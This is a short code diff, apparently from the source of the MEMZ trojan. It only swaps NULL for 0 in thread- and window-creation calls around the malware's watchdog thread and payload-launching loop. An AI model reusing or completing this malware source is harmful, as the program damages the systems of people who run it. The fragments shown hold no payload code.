@@ -7,7 +7,7 @@ void start() {
 
 	if (argc > 1) {
 		if (!lstrcmpW(argv[1], L"/watchdog")) {
-			CreateThread(NULL, NULL, &watchdogThread, NULL, NULL, NULL);
+			CreateThread(NULL, 0, &watchdogThread, NULL, 0, NULL);
 
 			WNDCLASSEXA c;
 			c.cbSize = sizeof(WNDCLASSEXA);
@@ -25,7 +25,7 @@ void start() {
 
 			RegisterClassExA(&c);
 
-			HWND hwnd = CreateWindowExA(0, "hax", NULL, NULL, 0, 0, 100, 100, NULL, NULL, NULL, NULL);
+			HWND hwnd = CreateWindowExA(0, "hax", NULL, 0, 0, 0, 100, 100, NULL, NULL, NULL, NULL);
 
 			MSG msg;
 			while (GetMessage(&msg, NULL, 0, 0) > 0) {
@@ -104,7 +104,7 @@ STILL EXECUTE IT?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
 
 	for (int p = 0; p < nPayloads; p++) {
 		Sleep(payloads[p].startDelay);
-		CreateThread(NULL, NULL, payloads[p].payloadHost, &payloads[p], NULL, NULL);
+		CreateThread(NULL, 0, payloads[p].payloadHost, &payloads[p], 0, NULL);
 	}
 
 	for (;;) {
